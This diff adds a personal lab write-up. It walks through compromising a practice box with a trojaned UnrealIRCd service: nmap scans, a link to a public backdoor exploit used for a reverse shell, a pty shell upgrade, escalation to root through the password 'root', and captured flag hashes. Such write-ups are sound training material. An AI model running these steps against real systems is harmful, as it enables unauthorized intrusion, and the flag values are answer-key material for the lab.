@@ -1,0 +1,80 @@
+
+my ip: `192.168.49.113`
+
+nmap
+```
+└─$ sudo nmap -sX -sV -Pn 192.168.113.120
+[sudo] password for gomez22:
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 10:30 PDT
+Nmap scan report for 192.168.113.120
+Host is up.
+Not shown: 999 open|filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     UnrealIRCd
+Service Info: Host: irc.foonet.com
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 210.33 seconds
+```
+
+nmap to enumerate UnrealIRCd
+```
+└─$ nmap -sV --script irc-info,irc-unrealircd-backdoor -p 6667 192.168.113.120
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 10:55 PDT
+Nmap scan report for 192.168.113.120
+Host is up (0.082s latency).
+
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     UnrealIRCd
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+Service Info: Host: irc.foonet.com
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
+```
+
+found python exploit script online and used that to get reverse shell
+<python script attribution here> -> https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py
+
+foothold!
+```
+whoami
+server
+python --version
+python3 --version
+Python 3.7.3
+python3 -c "import pty; pty.spawn('/bin/sh')"
+$ cd /home
+cd /home
+$ ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Aug  8  2020 .
+drwxr-xr-x 18 root   root   4096 Dec  3  2020 ..
+drwxr-xr-x  3 server server 4096 Dec  3  2020 server
+$ cd server
+cd server
+$ ls
+ls
+irc  local.txt
+$ cat local.txt
+cat local.txt
+10a8093327f7a8fddcd06ceea10fbc4c
+```
+
+had to find a walkthrough. Linpeas wasn't showing `root:root` even when using the -a and -e flags on latest linpeas version. Walkthrough showed that
+linpeas should've found that root's password was root. I think I'll have to find another tool to help with enumeration.
+```
+server@noontide:/tmp$ su root
+su root
+Password: root
+pwd
+/tmp
+whoami
+root
+cd /root
+ls
+proof.txt
+cat proof.txt
+c7b5db778c92540c981ac72665abaec6
+```
